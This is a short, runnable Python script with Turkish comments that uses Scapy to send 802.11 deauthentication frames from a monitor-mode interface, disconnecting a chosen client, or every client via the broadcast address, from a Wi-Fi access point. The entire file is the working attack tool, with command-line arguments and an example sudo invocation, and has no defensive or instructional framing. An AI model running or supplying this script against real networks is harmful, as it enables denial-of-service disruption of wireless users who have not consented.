#!/usr/bin/env python3
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import sys

def deauth(target_mac, ap_mac, iface="mon0", count=100):
    """
    Deauthentication saldırısı gönderir.
    target_mac : İstemci MAC adresi (FF:FF:FF:FF:FF:FF tüm cihazlar için)
    ap_mac      : Erişim noktası MAC adresi
    iface       : Monitör modundaki arayüz
    count       : Gönderilecek paket sayısı
    """
    # 802.11 çerçevesi oluştur
    frame = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    
    print(f"[*] Deauth başlatıldı: Hedef={target_mac} AP={ap_mac} ({count} paket)")
    sendp(frame, iface=iface, count=count, inter=0.1, verbose=False)
    print("[+] Tamamlandı")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Kullanım: {sys.argv[0]} <HEDEF_MAC> <AP_MAC> [ARAYUZ] [PAKET_SAYISI]")
        print("Örnek: sudo python3 deauth.py AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 mon0 50")
        sys.exit(1)
    
    target = sys.argv[1]
    ap = sys.argv[2]
    iface = sys.argv[3] if len(sys.argv) > 3 else "mon0"
    count = int(sys.argv[4]) if len(sys.argv) > 4 else 100
    
    deauth(target, ap, iface, count)
